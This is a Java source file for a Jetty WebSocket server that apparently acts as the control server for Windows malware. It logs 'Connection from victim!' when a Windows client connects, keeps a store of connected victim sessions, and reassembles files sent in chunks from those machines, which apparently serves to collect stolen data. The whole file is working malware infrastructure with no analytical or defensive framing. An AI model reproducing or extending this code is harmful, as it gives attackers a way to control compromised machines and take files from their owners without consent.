package Server;

import org.eclipse.jetty.servlet.ServletContextHandler;
import org.eclipse.jetty.servlet.ServletHolder;
import org.eclipse.jetty.websocket.api.Session;
import org.eclipse.jetty.websocket.api.annotations.*;

import java.io.IOException;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;

@WebSocket
@SuppressWarnings("unused")
public class Server {

    private int port;
    private org.eclipse.jetty.server.Server server;

    public Server() {
        this.port = 3055;
    }

    public Server(int port) {
        this.port = port;
    }

    @OnWebSocketError
    public void handleError(Session session, Throwable throwable) {
        if (throwable instanceof org.eclipse.jetty.io.EofException
                || (throwable.getCause() != null
                && throwable.getCause() instanceof java.io.IOException
                && "Connection reset by peer".equals(throwable.getCause().getMessage()))) {
            // Handle the abrupt disconnection here
            ConnectionStore.removeConnection(session);
            System.out.println("Client disconnected abruptly.");
        } else {
            // Handle other errors
            System.out.println("An error occurred: " + throwable.getMessage());
        }
    }

    // ... Ot

    @OnWebSocketMessage
    public void onMessage(Session session, String message) {
        System.out.println(message);
        ConnectionStore.getConnection(session).processMessage(message);
    }

    @OnWebSocketConnect
    public void onConnect(Session session) throws IOException {
        Client client = new Client(session);
        String clientType = session.getUpgradeRequest().getHeader("Client-Type");
        if (clientType.equals("Windows")){
            System.out.println("Connection from victim!");
            ConnectionStore.addConnection(session, client);
        }

        System.out.println("New connection from " + session.getRemoteAddress().getAddress().getHostAddress());
    }

    @OnWebSocketClose
    public void onClose(Session session, int statusCode, String reason) {
        ConnectionStore.removeConnection(session);
        System.out.println("Closed connection to " + session.getRemoteAddress().getAddress().getHostAddress());
    }

    // Java (Servidor)

    // Global variable

    @OnWebSocketMessage
    public void onMessage(Session session, byte[] buf, int offset, int length) {
        Client client = ConnectionStore.getConnection(session);
        ConcurrentHashMap<Byte, BytesChannel> sessionToFileChannels = client.getFileChannels();

        byte fileId = buf[offset];
        byte control = buf[offset + 1];

        BytesChannel bytesChannel = sessionToFileChannels.get(fileId);
        if (bytesChannel == null) {
            return;
        }

        byte[] finalData = bytesChannel.handleMessage(buf, offset, length, control);

        if (finalData != null) {

            client.handleFileCompletion(bytesChannel, finalData);
        }
    }


    public void startServer() {
        server = new org.eclipse.jetty.server.Server(port);
        ServletContextHandler context = new ServletContextHandler(ServletContextHandler.SESSIONS);
        context.setContextPath("/");
        server.setHandler(context);

        ServletHolder wsHolder = new ServletHolder("ws", new org.eclipse.jetty.websocket.servlet.WebSocketServlet() {
            @Override
            public void configure(org.eclipse.jetty.websocket.servlet.WebSocketServletFactory factory) {
                // Configura el tamaño máximo del mensaje (en bytes).
                factory.getPolicy().setMaxTextMessageSize(204800);
                factory.getPolicy().setMaxBinaryMessageSize(204800);

                factory.register(Server.class);
            }
        });
        context.addServlet(wsHolder, "/");

        try {
            server.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void stopServer() {
        if (server != null && server.isRunning()) {
            try {
                server.stop();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public boolean isRunning() {
        return server != null && server.isRunning();
    }

    public int getPort() {
        return port;
    }

    public void definePort(int port) {
        this.port = port;
    }

}
